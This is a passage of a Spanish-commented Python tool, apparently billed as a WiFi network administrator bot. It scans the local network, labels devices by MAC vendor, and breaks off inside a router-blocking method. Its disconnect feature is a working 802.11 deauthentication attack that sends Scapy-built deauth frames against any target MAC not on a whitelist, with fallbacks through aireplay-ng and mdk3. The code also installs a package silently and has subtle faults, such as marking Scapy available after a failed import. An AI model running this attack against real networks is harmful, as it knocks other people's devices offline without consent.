#!/usr/bin/env python3
"""
WiFi Network Administrator Bot
Herramienta profesional para administrar tu propia red WiFi
Autor: Alvaro Manz0

"""

import os
import sys
import json
import time
import threading
import subprocess
import logging
import re
from datetime import datetime
from typing import Dict, List, Optional
import argparse
from pathlib import Path

class Colors:
    """Clase para colores en terminal"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Importaciones para networking después de definir Colors
SCAPY_AVAILABLE = False
NETIFACES_AVAILABLE = False

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    print(f"{Colors.YELLOW}⚠️  Scapy está disponible pero con limitaciones.{Colors.END}")
    SCAPY_AVAILABLE = True  # Está instalado, pero puede tener algunos problemas

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    print(f"{Colors.YELLOW}⚠️  Netifaces no está disponible. Usando alternativas.{Colors.END}")
    NETIFACES_AVAILABLE = False

try:
    import psutil
except ImportError:
    print(f"{Colors.YELLOW}⚠️  Psutil no está disponible. Instalando...{Colors.END}")
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'psutil'], check=False)

class WiFiNetworkBot:
    """Bot principal para administración de red WiFi"""
    
    def __init__(self, config_file="wifi_config.json"):
        self.config_file = config_file
        self.config = self.load_config()
        self.setup_logging()
        self.devices = {}
        self.monitoring = False
        self.interface = None
        
        print(f"{Colors.CYAN}{Colors.BOLD}")
        print("=" * 60)
        print("     🛡️  WIFI NETWORK ADMINISTRATOR BOT 🛡️")
        print("    Herramienta profesional de administración")
        print("=" * 60)
        print(f"{Colors.END}")
        
        # Auto-detectar configuración de red
        self.auto_detect_network_config()
    
    def load_config(self) -> Dict:
        """Cargar configuración del archivo JSON"""
        default_config = {
            "network": {
                "interface": "wlan0",
                "gateway": "192.168.1.1",
                "network_range": "192.168.1.0/24"
            },
            "security": {
                "whitelist": [],
                "protected_devices": [],
                "admin_mac": ""
            },
            "settings": {
                "scan_interval": 10,
                "deauth_count": 5,
                "log_level": "INFO",
                "auto_scan": True
            },
            "notifications": {
                "new_device_alert": True,
                "deauth_notifications": True
            }
        }
        
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                # Merge with defaults
                for key in default_config:
                    if key not in config:
                        config[key] = default_config[key]
                return config
            except Exception as e:
                print(f"{Colors.RED}Error cargando config: {e}{Colors.END}")
                return default_config
        else:
            self.save_config(default_config)
            return default_config
    
    def save_config(self, config=None):
        """Guardar configuración al archivo JSON"""
        if config is None:
            config = self.config
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=4)
        except Exception as e:
            print(f"{Colors.RED}Error guardando config: {e}{Colors.END}")
    
    def setup_logging(self):
        """Configurar sistema de logging"""
        log_level = getattr(logging, self.config['settings']['log_level'])
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('wifi_admin.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        self.logger.info("WiFi Network Bot iniciado")
    
    def auto_detect_network_config(self):
        """Auto-detectar configuración de red actual"""
        print(f"{Colors.BLUE}🔍 Auto-detectando configuración de red...{Colors.END}")
        
        try:
            # Detectar interfaz activa
            active_interface = self.detect_active_interface()
            if active_interface:
                print(f"{Colors.GREEN}✅ Interfaz detectada: {active_interface}{Colors.END}")
                self.config['network']['interface'] = active_interface
            
            # Detectar gateway
            gateway = self.detect_gateway()
            if gateway:
                print(f"{Colors.GREEN}✅ Gateway detectado: {gateway}{Colors.END}")
                self.config['network']['gateway'] = gateway
                
                # Calcular rango de red
                network_range = self.calculate_network_range(gateway)
                if network_range:
                    print(f"{Colors.GREEN}✅ Rango de red detectado: {network_range}{Colors.END}")
                    self.config['network']['network_range'] = network_range
            
            # Guardar configuración actualizada
            self.save_config()
            
        except Exception as e:
            print(f"{Colors.YELLOW}⚠️  Error en auto-detección: {e}{Colors.END}")
            self.logger.warning(f"Error en auto-detección de red: {e}")
    
    def detect_active_interface(self) -> Optional[str]:
        """Detectar interfaz de red activa"""
        try:
            if sys.platform == "darwin":  # macOS
                result = subprocess.run(['route', '-n', 'get', 'default'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'interface:' in line:
                            return line.split(':')[1].strip()
            else:  # Linux
                result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    parts = result.stdout.split()
                    if 'dev' in parts:
                        dev_index = parts.index('dev')
                        if dev_index + 1 < len(parts):
                            return parts[dev_index + 1]
            
            return None
        except Exception as e:
            self.logger.error(f"Error detectando interfaz: {e}")
            return None
    
    def detect_gateway(self) -> Optional[str]:
        """Detectar gateway de red"""
        try:
            if sys.platform == "darwin":  # macOS
                result = subprocess.run(['route', '-n', 'get', 'default'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'gateway:' in line:
                            return line.split(':')[1].strip()
            else:  # Linux
                result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    parts = result.stdout.split()
                    if 'via' in parts:
                        via_index = parts.index('via')
                        if via_index + 1 < len(parts):
                            return parts[via_index + 1]
            
            return None
        except Exception as e:
            self.logger.error(f"Error detectando gateway: {e}")
            return None
    
    def calculate_network_range(self, gateway: str) -> Optional[str]:
        """Calcular rango de red basado en gateway"""
        try:
            # Asumir máscara /24 (255.255.255.0) por defecto
            parts = gateway.split('.')
            if len(parts) == 4:
                network_base = '.'.join(parts[:3]) + '.0'
                return f"{network_base}/24"
            return None
        except Exception as e:
            self.logger.error(f"Error calculando rango: {e}")
            return None
    
    def check_permissions(self) -> bool:
        """Verificar permisos de administrador"""
        if os.geteuid() != 0:
            print(f"{Colors.RED}❌ Error: Se requieren permisos de root{Colors.END}")
            print(f"{Colors.YELLOW}Ejecuta: sudo python3 {sys.argv[0]}{Colors.END}")
            return False
        return True
    
    def get_network_interfaces(self) -> List[str]:
        """Obtener interfaces de red disponibles"""
        interfaces = []
        try:
            if NETIFACES_AVAILABLE:
                # Usar netifaces si está disponible
                for iface in netifaces.interfaces():
                    if iface != 'lo':  # Excluir loopback
                        addresses = netifaces.ifaddresses(iface)
                        if netifaces.AF_INET in addresses:
                            interfaces.append(iface)
            else:
                # Método alternativo usando comandos del sistema
                if sys.platform == "darwin":  # macOS
                    result = subprocess.run(['ifconfig'], capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if line and not line.startswith('\t') and not line.startswith(' '):
                            iface = line.split(':')[0]
                            if iface not in ['lo0']:
                                interfaces.append(iface)
                else:  # Linux
                    result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if ': ' in line and 'state' in line:
                            iface = line.split(': ')[1].split('@')[0]
                            if iface != 'lo':
                                interfaces.append(iface)
            
            return interfaces if interfaces else ['en0', 'wlan0', 'eth0']  # Default fallback
        except Exception as e:
            self.logger.error(f"Error obteniendo interfaces: {e}")
            return ['en0', 'wlan0', 'eth0']  # Default fallback
    
    def setup_monitor_mode(self, interface: str) -> bool:
        """Configurar modo monitor en la interfaz (adaptado para macOS)"""
        try:
            print(f"{Colors.YELLOW}Configurando interfaz {interface} para escaneo...{Colors.END}")
            
            if sys.platform == "darwin":  # macOS
                # En macOS no necesitamos modo monitor para el escaneo básico
                # Solo verificamos que la interfaz esté activa
                result = subprocess.run(['ifconfig', interface], capture_output=True, text=True)
                if 'status: active' in result.stdout:
                    print(f"{Colors.GREEN}✅ Interfaz {interface} está activa y lista{Colors.END}")
                    return True
                else:
                    print(f"{Colors.YELLOW}⚠️  Interfaz {interface} no está activa completamente{Colors.END}")
                    print(f"{Colors.BLUE}ℹ️  Continuando con funcionalidad limitada...{Colors.END}")
                    return True  # Continuar de todas formas
            else:
                # Linux - intentar modo monitor tradicional
                try:
                    # Verificar si iwconfig existe
                    subprocess.run(['which', 'iwconfig'], check=True, capture_output=True)
                    
                    # Bajar interfaz
                    subprocess.run(['ifconfig', interface, 'down'], check=True, capture_output=True)
                    
                    # Configurar modo monitor
                    subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True, capture_output=True)
                    
                    # Subir interfaz
                    subprocess.run(['ifconfig', interface, 'up'], check=True, capture_output=True)
                    
                    print(f"{Colors.GREEN}✅ Modo monitor configurado en {interface}{Colors.END}")
                    return True
                    
                except subprocess.CalledProcessError:
                    print(f"{Colors.YELLOW}⚠️  No se pudo configurar modo monitor, usando modo regular{Colors.END}")
                    return True
            
        except Exception as e:
            print(f"{Colors.YELLOW}⚠️  Error configurando interfaz: {e}{Colors.END}")
            print(f"{Colors.BLUE}ℹ️  Continuando sin modo monitor...{Colors.END}")
            return True  # Continuar de todas formas para permitir escaneo básico
    
    def scan_network_devices(self) -> Dict:
        """Escanear dispositivos en la red"""
        print(f"{Colors.BLUE}🔍 Escaneando red...{Colors.END}")
        devices = {}
        
        try:
            if SCAPY_AVAILABLE:
                # Método usando Scapy (más preciso)
                devices = self._scan_with_scapy()
            else:
                # Método alternativo usando nmap
                devices = self._scan_with_nmap()
            
            # Actualizar dispositivos conocidos
            for mac, device in devices.items():
                if mac not in self.devices:
                    self.notify_new_device(device)
            
            self.devices.update(devices)
            return devices
            
        except Exception as e:
            self.logger.error(f"Error escaneando red: {e}")
            return {}
    
    def _scan_with_scapy(self) -> Dict:
        """Escanear usando Scapy"""
        devices = {}
        network = self.config['network']['network_range']
        
        # Crear y enviar paquetes ARP
        from scapy.all import ARP, Ether, srp
        arp_request = ARP(pdst=network)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        for element in answered_list:
            ip = element[1].psrc
            mac = element[1].hwsrc
            
            # Obtener información adicional
            hostname = self.get_hostname(ip)
            vendor, device_type = self.get_vendor_and_device_type(mac, hostname, ip)
            
            devices[mac] = {
                'ip': ip,
                'mac': mac,
                'hostname': hostname,
                'vendor': vendor,
                'device_type': device_type,
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'status': 'online'
            }
        
        return devices
    
    def _scan_with_nmap(self) -> Dict:
        """Escanear usando nmap como alternativa"""
        devices = {}
        network = self.config['network']['network_range']
        
        try:
            print(f"{Colors.YELLOW}🔍 Escaneando con nmap: {network}...{Colors.END}")
            
            # Usar nmap para escanear la red con opciones más agresivas para macOS
            cmd = ['nmap', '-sn', '-T4', '--host-timeout', '10s', network]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}✅ Nmap completado{Colors.END}")
                lines = result.stdout.split('\n')
                current_ip = None
                
                for line in lines:
                    if 'Nmap scan report for' in line:
                        # Extraer IP
                        parts = line.split()
                        if '(' in line and ')' in line:
                            current_ip = line.split('(')[1].split(')')[0]
                        else:
                            current_ip = parts[-1]
                        
                        # Si no encontramos MAC, al menos agregar la IP
                        if current_ip and self.is_valid_ip(current_ip):
                            mac = self.get_mac_from_ip(current_ip)
                            if mac and mac != "00:00:00:00:00:00":
                                hostname = self.get_hostname(current_ip)
                                vendor, device_type = self.get_vendor_and_device_type(mac, hostname, current_ip)
                                
                                devices[mac] = {
                                    'ip': current_ip,
                                    'mac': mac,
                                    'hostname': hostname,
                                    'vendor': vendor,
                                    'device_type': device_type,
                                    'first_seen': datetime.now().isoformat(),
                                    'last_seen': datetime.now().isoformat(),
                                    'status': 'online'
                                }
                            else:
                                # Agregar dispositivo sin MAC (solo IP)
                                fake_mac = f"NO:MA:C0:00:00:{len(devices):02d}"
                                devices[fake_mac] = {
                                    'ip': current_ip,
                                    'mac': fake_mac,
                                    'hostname': self.get_hostname(current_ip),
                                    'vendor': 'Desconocido',
                                    'first_seen': datetime.now().isoformat(),
                                    'last_seen': datetime.now().isoformat(),
                                    'status': 'online'
                                }
                    
                    elif 'MAC Address:' in line and current_ip:
                        # Extraer MAC si está disponible
                        mac_part = line.split('MAC Address: ')[1]
                        mac = mac_part.split()[0]
                        
                        # Actualizar dispositivo con MAC real
                        if current_ip in [d['ip'] for d in devices.values()]:
                            # Encontrar y actualizar el dispositivo
                            for old_mac, device in list(devices.items()):
                                if device['ip'] == current_ip and old_mac.startswith('NO:MA:C0'):
                                    # Remover entrada antigua y crear nueva con MAC real
                                    del devices[old_mac]
                                    device['mac'] = mac
                                    device['vendor'] = self.get_vendor(mac)
                                    devices[mac] = device
                                    break
                        current_ip = None
                
                print(f"{Colors.GREEN}✅ Encontrados {len(devices)} dispositivos con nmap{Colors.END}")
            else:
                print(f"{Colors.YELLOW}⚠️  Nmap falló, usando método alternativo...{Colors.END}")
                devices = self._scan_with_ping()
                
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            print(f"{Colors.YELLOW}⚠️  Nmap no disponible ({e}), usando ping...{Colors.END}")
            devices = self._scan_with_ping()
        
        return devices
    
    def is_valid_ip(self, ip: str) -> bool:
        """Verificar si es una IP válida"""
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except:
            return False
    
    def _scan_with_ping(self) -> Dict:
        """Método básico usando ping optimizado para macOS"""
        devices = {}
        gateway = self.config['network']['gateway']
        base_ip = '.'.join(gateway.split('.')[:-1]) + '.'
        
        print(f"{Colors.YELLOW}🔍 Escaneando con ping: {base_ip}1-254...{Colors.END}")
        
        # Escanear rango común primero (1-50, 100-150, 200-254)
        ranges_to_scan = [
            range(1, 51),      # 1-50 (dispositivos comunes)
            range(100, 151),   # 100-150 (rango común DHCP)
            range(200, 255)    # 200-254 (otros dispositivos)
        ]
        
        total_found = 0
        
        for ip_range in ranges_to_scan:
            for i in ip_range:
                ip = base_ip + str(i)
                try:
                    # Ping optimizado para macOS
                    if sys.platform == "darwin":
                        result = subprocess.run(['ping', '-c', '1', '-W', '500', ip], 
                                             capture_output=True, timeout=1)
                    else:
                        result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                             capture_output=True, timeout=1)
                    
                    if result.returncode == 0:
                        print(f"{Colors.GREEN}✅ Dispositivo encontrado: {ip}{Colors.END}")
                        
                        # Obtener MAC usando ARP
                        mac = self.get_mac_from_ip(ip)
                        
                        if mac and mac != "00:00:00:00:00:00":
                            hostname = self.get_hostname(ip)
                            vendor, device_type = self.get_vendor_and_device_type(mac, hostname, ip)
                            
                            devices[mac] = {
                                'ip': ip,
                                'mac': mac,
                                'hostname': hostname,
                                'vendor': vendor,
                                'device_type': device_type,
                                'first_seen': datetime.now().isoformat(),
                                'last_seen': datetime.now().isoformat(),
                                'status': 'online'
                            }
                            total_found += 1
                        else:
                            # Agregar dispositivo sin MAC conocida
                            fake_mac = f"UN:KN:OW:N0:{i:02d}:{total_found:02d}"
                            devices[fake_mac] = {
                                'ip': ip,
                                'mac': fake_mac,
                                'hostname': self.get_hostname(ip),
                                'vendor': 'MAC no disponible',
                                'first_seen': datetime.now().isoformat(),
                                'last_seen': datetime.now().isoformat(),
                                'status': 'online'
                            }
                            total_found += 1
                            
                except subprocess.TimeoutExpired:
                    continue
        
        print(f"{Colors.GREEN}✅ Escaneo completado: {total_found} dispositivos encontrados{Colors.END}")
        return devices
    
    def get_mac_from_ip(self, ip: str) -> Optional[str]:
        """Obtener MAC address de una IP usando ARP mejorado"""
        try:
            if sys.platform == "darwin":  # macOS
                # Método 1: arp -n
                result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if ip in line and '(' in line and ')' in line:
                            # Formato: IP (IP) at MAC on interface
                            parts = line.split()
                            for part in parts:
                                if ':' in part and len(part) == 17:
                                    return part.upper()
                
                # Método 2: ping + arp (forzar entrada ARP)
                subprocess.run(['ping', '-c', '1', ip], 
                             capture_output=True, timeout=1)
                result = subprocess.run(['arp', ip], capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'at' in line:
                            parts = line.split()
                            for i, part in enumerate(parts):
                                if part == 'at' and i + 1 < len(parts):
                                    mac_candidate = parts[i + 1]
                                    if ':' in mac_candidate and len(mac_candidate) == 17:
                                        return mac_candidate.upper()
                
            else:  # Linux
                result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if ip in line:
                            parts = line.split()
                            for part in parts:
                                if ':' in part and len(part) == 17:
                                    return part.upper()
            
            return None
        except Exception as e:
            self.logger.debug(f"Error obteniendo MAC para {ip}: {e}")
            return None
    
    def get_hostname(self, ip: str) -> str:
        """Obtener hostname de una IP"""
        try:
            result = subprocess.run(['nslookup', ip], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'name =' in line:
                        return line.split('name = ')[1].strip()
            return "Desconocido"
        except:
            return "Desconocido"
    
    def get_vendor_and_device_type(self, mac: str, hostname: str = "", ip: str = "") -> tuple:
        """Obtener fabricante y tipo de dispositivo por MAC y otros datos"""
        # Base de datos extendida de fabricantes y tipos de dispositivo
        device_database = {
            # Apple
            '00:1B:63': ('Apple', 'iPhone/iPad'),
            '00:25:00': ('Apple', 'iPhone/iPad'),
            '00:26:08': ('Apple', 'iPhone/iPad'),
            '28:16:AD': ('Apple', 'iPhone/iPad'),
            '3C:15:C2': ('Apple', 'iPhone/iPad'),
            '40:CB:C0': ('Apple', 'iPhone/iPad'),
            '78:4F:43': ('Apple', 'iPhone/iPad'),
            '80:E6:50': ('Apple', 'iPhone/iPad'),
            'AC:BC:32': ('Apple', 'iPhone/iPad'),
            'DC:2B:61': ('Apple', 'iPhone/iPad'),
            'F0:DB:E2': ('Apple', 'iPhone/iPad'),
            'A4:5E:60': ('Apple', 'MacBook/iMac'),
            'AC:87:A3': ('Apple', 'MacBook/iMac'),
            'F4:F1:5A': ('Apple', 'MacBook/iMac'),
            '38:C9:86': ('Apple', 'AppleTV'),
            '7C:C3:A1': ('Apple', 'AppleTV'),
            
            # Samsung
            '00:15:99': ('Samsung', 'Smart TV'),
            '00:16:6B': ('Samsung', 'Smart TV'),
            '3C:8B:F8': ('Samsung', 'Smart TV'),
            '40:5B:D8': ('Samsung', 'Smart TV'),
            '48:44:F7': ('Samsung', 'Smart TV'),
            '78:BD:BC': ('Samsung', 'Smart TV'),
            '88:32:9B': ('Samsung', 'Smart TV'),
            'C8:BA:94': ('Samsung', 'Smart TV'),
            'E8:50:8B': ('Samsung', 'Smart TV'),
            '08:EC:A9': ('Samsung', 'Teléfono Galaxy'),
            '2C:44:01': ('Samsung', 'Teléfono Galaxy'),
            '34:23:87': ('Samsung', 'Teléfono Galaxy'),
            '38:AA:3C': ('Samsung', 'Teléfono Galaxy'),
            '5C:0A:5B': ('Samsung', 'Teléfono Galaxy'),
            '78:1F:DB': ('Samsung', 'Teléfono Galaxy'),
            
            # LG
            '00:E0:91': ('LG', 'Smart TV'),
            '20:21:A5': ('LG', 'Smart TV'),
            '68:B5:99': ('LG', 'Smart TV'),
            'A0:07:98': ('LG', 'Smart TV'),
            'B4:E7:F4': ('LG', 'Smart TV'),
            'CC:2D:8C': ('LG', 'Smart TV'),
            
            # Sony
            '00:1D:BA': ('Sony', 'Smart TV/PlayStation'),
            '04:4E:AF': ('Sony', 'Smart TV/PlayStation'),
            '0C:14:20': ('Sony', 'Smart TV/PlayStation'),
            '18:F0:E4': ('Sony', 'Smart TV/PlayStation'),
            '20:54:FA': ('Sony', 'Smart TV/PlayStation'),
            '34:C8:03': ('Sony', 'Smart TV/PlayStation'),
            '7C:BB:8A': ('Sony', 'PlayStation'),
            'FC:0F:E7': ('Sony', 'PlayStation'),
            
            # Microsoft
            '00:50:F2': ('Microsoft', 'Xbox/PC'),
            '00:0D:3A': ('Microsoft', 'Xbox/PC'),
            '7C:ED:8D': ('Microsoft', 'Xbox'),
            '98:5F:D3': ('Microsoft', 'Xbox'),
            'E4:A7:A0': ('Microsoft', 'Xbox'),
            
            # Nintendo
            '00:19:1D': ('Nintendo', 'Switch/Wii'),
            '00:21:BD': ('Nintendo', 'Switch/Wii'),
            '58:BD:A3': ('Nintendo', 'Switch'),
            'B8:78:2E': ('Nintendo', 'Switch'),
            
            # Google/Android
            '64:16:8D': ('Google', 'Chromecast'),
            '6C:AD:F8': ('Google', 'Chromecast'),
            'AA:BB:CC': ('Google', 'Nest/Home'),
            
            # Xiaomi
            '34:CE:00': ('Xiaomi', 'Teléfono/TV Box'),
            '50:8F:4C': ('Xiaomi', 'Teléfono/TV Box'),
            '74:51:BA': ('Xiaomi', 'Teléfono/TV Box'),
            '78:11:DC': ('Xiaomi', 'Teléfono/TV Box'),
            
            # TP-Link
            '14:CC:20': ('TP-Link', 'Router/Extensor'),
            '50:C7:BF': ('TP-Link', 'Router/Extensor'),
            '98:DA:C4': ('TP-Link', 'Router/Extensor'),
            
            # Roku
            '00:0D:4B': ('Roku', 'Streaming Device'),
            'AC:3A:7A': ('Roku', 'Streaming Device'),
            'B0:A7:37': ('Roku', 'Streaming Device'),
            
            # Amazon
            '44:65:0D': ('Amazon', 'Fire TV/Echo'),
            '74:75:48': ('Amazon', 'Fire TV/Echo'),
            '8C:41:F2': ('Amazon', 'Fire TV/Echo'),
            
            # Virtualization
            '00:50:56': ('VMware', 'Máquina Virtual'),
            '00:0C:29': ('VMware', 'Máquina Virtual'),
            '08:00:27': ('VirtualBox', 'Máquina Virtual'),
            '00:1C:42': ('Parallels', 'Máquina Virtual'),
            
            # IoT/Smart Home
            'DC:A6:32': ('Raspberry Pi', 'Mini PC/IoT'),
            'B8:27:EB': ('Raspberry Pi', 'Mini PC/IoT'),
        }
        
        mac_prefix = mac[:8].upper()
        vendor_info = device_database.get(mac_prefix)
        
        if vendor_info:
            vendor, device_type = vendor_info
        else:
            vendor = "Desconocido"
            device_type = self._guess_device_type(mac, hostname, ip)
        
        return vendor, device_type
    
    def get_device_icon(self, device_type: str) -> str:
        """Obtener emoji/icono para el tipo de dispositivo"""
        icons = {
            'iPhone/iPad': '📱',
            'Teléfono Android': '📱',
            'Teléfono Galaxy': '📱',
            'MacBook/iMac': '💻',
            'Computadora': '💻',
            'Smart TV': '📺',
            'AppleTV': '📺',
            'Streaming Device': '📺',
            'Consola de Juegos': '🎮',
            'PlayStation': '🎮',
            'Xbox': '🎮',
            'Nintendo Switch': '🎮',
            'Router/Módem': '🌐',
            'Router/Extensor': '🌐',
            'Asistente Virtual': '🔊',
            'Fire TV/Echo': '🔊',
            'Nest/Home': '🔊',
            'Impresora': '🖨️',
            'Mini PC/IoT': '🔧',
            'Máquina Virtual': '⚙️',
            'Chromecast': '📺',
            'Roku': '📺',
            'TV Box': '📺'
        }
        
        # Buscar por coincidencias parciales
        for key, icon in icons.items():
            if key.lower() in device_type.lower():
                return icon
        
        return '❓'  # Icono por defecto para desconocido
    
    def _guess_device_type(self, mac: str, hostname: str = "", ip: str = "") -> str:
        """Adivinar tipo de dispositivo basado en hostname y otros indicadores"""
        hostname_lower = hostname.lower()
        
        # Patrones en hostnames
        if any(pattern in hostname_lower for pattern in ['android', 'galaxy', 'pixel']):
            return 'Teléfono Android'
        elif any(pattern in hostname_lower for pattern in ['iphone', 'ipad']):
            return 'iPhone/iPad'
        elif any(pattern in hostname_lower for pattern in ['smart-tv', 'tv', 'samsung-tv', 'lg-tv']):
            return 'Smart TV'
        elif any(pattern in hostname_lower for pattern in ['xbox', 'playstation', 'ps4', 'ps5']):
            return 'Consola de Juegos'
        elif any(pattern in hostname_lower for pattern in ['chromecast', 'roku', 'firetv']):
            return 'Streaming Device'
        elif any(pattern in hostname_lower for pattern in ['laptop', 'desktop', 'pc', 'macbook']):
            return 'Computadora'
        elif any(pattern in hostname_lower for pattern in ['router', 'gateway', 'modem']):
            return 'Router/Módem'
        elif any(pattern in hostname_lower for pattern in ['echo', 'alexa', 'nest', 'home']):
            return 'Asistente Virtual'
        elif any(pattern in hostname_lower for pattern in ['printer', 'hp-', 'canon-', 'epson-']):
            return 'Impresora'
        else:
            return 'Dispositivo Desconocido'
    
    def get_vendor(self, mac: str) -> str:
        """Mantener compatibilidad - solo devolver vendor"""
        vendor, _ = self.get_vendor_and_device_type(mac)
        return vendor
    
    def notify_new_device(self, device: Dict):
        """Notificar nuevo dispositivo detectado"""
        if self.config['notifications']['new_device_alert']:
            device_type = device.get('device_type', 'Desconocido')
            icon = self.get_device_icon(device_type)
            
            print(f"{Colors.YELLOW}🔔 Nuevo dispositivo detectado:{Colors.END}")
            print(f"   {icon} Tipo: {Colors.CYAN}{device_type}{Colors.END}")
            print(f"   📍 IP: {Colors.WHITE}{device['ip']}{Colors.END}")
            print(f"   🏷️  MAC: {Colors.WHITE}{device['mac']}{Colors.END}")
            print(f"   🏢 Fabricante: {Colors.WHITE}{device.get('vendor', 'Desconocido')}{Colors.END}")
            if device.get('hostname') != 'Desconocido':
                print(f"   💻 Hostname: {Colors.WHITE}{device['hostname']}{Colors.END}")
            
            self.logger.info(f"Nuevo dispositivo {device_type}: {device['mac']} ({device['ip']})")
    
    def display_devices(self):
        """Mostrar dispositivos conectados"""
        print(f"\n{Colors.CYAN}{'='*80}")
        print(f"{'DISPOSITIVOS CONECTADOS':^80}")
        print(f"{'='*80}{Colors.END}")
        
        if not self.devices:
            print(f"{Colors.YELLOW}No hay dispositivos detectados{Colors.END}")
            return
        
        print(f"{Colors.BOLD}{'#':<3} {'IP':<15} {'MAC':<18} {'Tipo de Dispositivo':<20} {'Vendor':<12} {'Estado'}{Colors.END}")
        print("-" * 85)
        
        for i, (mac, device) in enumerate(self.devices.items(), 1):
            status_color = Colors.GREEN if device['status'] == 'online' else Colors.RED
            device_type = device.get('device_type', 'Desconocido')
            vendor = device.get('vendor', 'Desconocido')
            
            # Emojis para tipos de dispositivo
            type_icon = self.get_device_icon(device_type)
            device_display = f"{type_icon} {device_type}"
            
            print(f"{i:<3} {device['ip']:<15} {device['mac']:<18} {device_display:<20} {vendor:<12} {status_color}{device['status']}{Colors.END}")
    
    def is_protected_device(self, mac: str) -> bool:
        """Verificar si un dispositivo está protegido"""
        return (mac in self.config['security']['whitelist'] or 
                mac in self.config['security']['protected_devices'] or
                mac == self.config['security']['admin_mac'])
    
    def deauth_device(self, target_mac: str, target_ip: str = None) -> bool:
        """Desautenticar un dispositivo específico"""
        if self.is_protected_device(target_mac):
            print(f"{Colors.RED}❌ Dispositivo protegido, no se puede desconectar{Colors.END}")
            return False
        
        try:
            print(f"{Colors.YELLOW}🚫 Desconectando dispositivo {target_mac}...{Colors.END}")
            
            if SCAPY_AVAILABLE:
                return self._deauth_with_scapy(target_mac, target_ip)
            else:
                return self._deauth_alternative(target_mac, target_ip)
                
        except Exception as e:
            print(f"{Colors.RED}❌ Error desconectando dispositivo: {e}{Colors.END}")
            self.logger.error(f"Error en deauth: {e}")
            return False
    
    def _deauth_with_scapy(self, target_mac: str, target_ip: str = None) -> bool:
        """Deautenticación usando Scapy"""
        if not self.interface:
            print(f"{Colors.RED}❌ No hay interfaz en modo monitor configurada{Colors.END}")
            return False
        
        # Obtener BSSID del AP (router)
        gateway_mac = self.get_gateway_mac()
        if not gateway_mac:
            print(f"{Colors.RED}❌ No se pudo obtener MAC del gateway{Colors.END}")
            return False
        
        # Importar clases específicas de Scapy
        from scapy.all import RadioTap, sendp
        from scapy.layers.dot11 import Dot11, Dot11Deauth
        
        # Crear paquetes de deautenticación
        # Desde AP al cliente
        deauth1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
        # Desde cliente al AP
        deauth2 = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac) / Dot11Deauth()
        
        count = self.config['settings']['deauth_count']
        print(f"Enviando {count} paquetes de deautenticación...")
        
        for i in range(count):
            sendp(deauth1, iface=self.interface, verbose=False)
            sendp(deauth2, iface=self.interface, verbose=False)
            time.sleep(0.1)
        
        print(f"{Colors.GREEN}✅ Dispositivo desconectado: {target_mac}{Colors.END}")
        
        # Log de la acción
        self.logger.warning(f"Dispositivo desautenticado: {target_mac} ({target_ip})")
        
        # Notificación
        if self.config['notifications']['deauth_notifications']:
            print(f"{Colors.BLUE}📱 Notificación: Dispositivo {target_mac} ha sido desconectado{Colors.END}")
        
        return True
    
    def _deauth_alternative(self, target_mac: str, target_ip: str = None) -> bool:
        """Método alternativo de desconexión (usando herramientas del sistema)"""
        try:
            print(f"{Colors.YELLOW}Usando método alternativo de desconexión...{Colors.END}")
            
            # Método 1: Bloqueo a nivel de router (si es posible)
            if self._try_router_block(target_mac, target_ip):
                return True
            
            # Método 2: Usar aireplay-ng si está disponible
            if self._try_aireplay_deauth(target_mac):
                return True
            
            # Método 3: Usar mdk3 si está disponible
            if self._try_mdk3_deauth(target_mac):
                return True
            
            # Método 4: Interferencia de red
            if self._try_network_interference(target_mac, target_ip):
                return True
            
            # Método 5: Simulación educativa
            return self._simulate_deauth(target_mac, target_ip)
            
        except Exception as e:
            self.logger.error(f"Error en deauth alternativo: {e}")
            return False
    
    def _try_router_block(self, target_mac: str, target_ip: str = None) -> bool:
        """Intentar bloquear en el router (método más efectivo)"""
        try:
            print(f"{Colors.BLUE}🔒 Intentando bloqueo a nivel de router...{Colors.END}")
            
